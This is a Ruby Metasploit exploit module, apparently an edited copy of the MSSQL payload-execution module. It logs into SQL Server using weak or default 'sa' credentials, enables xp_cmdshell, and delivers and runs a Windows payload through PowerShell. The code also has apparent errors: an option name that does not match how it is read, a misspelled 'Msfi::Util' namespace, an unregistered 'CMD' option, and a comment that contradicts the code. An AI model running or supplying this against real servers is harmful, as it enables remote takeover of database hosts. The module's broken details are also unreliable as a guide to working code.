##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core' # require core libraries

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server Payload Execution',
      'Description'    => %q{
        This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors
      },
      'Author'         =>
        [
          'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',  # original module, debug.exe method, powershell method
          'jduck'  # command stager mods
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          # 'sa' password in logs
          [ 'CVE', '2000-0402' ],
          [ 'OSVDB', '557' ],
          [ 'BID', '1281' ],

          # blank default 'sa' password
          [ 'CVE', '2000-1209' ],
          [ 'OSVDB', '15757' ],
          [ 'BID', '4797' ]
        ],
      'Platform'       => 'win', # target only windows
      'Targets'        =>
        [
          [ 'Automatic', { } ],  # automatic targeting
        ], 
      'DefaultTarget'  => 0,
      ))
    
    register_options( # register options for the user to pick form
      [
        OptBool.new('UsePowershell', [ false, "Use PowerShell as payload delivery method instead", true ]) # default to PowerShellh
      ])
  end

  def run #enable xp_cmdshell in mssql 2005/2008
    mssql_xpcmdshell(datastore['CMD'], true)
  end

  def exploit # define our exploit here; it does nothing at this point
    # if u/n and p/w/ didnt't work throw error
    if (not mssql_login_datastore)
      print_status("Invalid SQL Server credentials")
	    return
    end

    # Use powershell method for payload delivery
    if (datastore['UsePowerShell'])
	    powershell_upload_exec(Msfi::Util::EXE.to_win32pe(framework, payload.encoded))
    end

    handler
    disconnect
  end
end
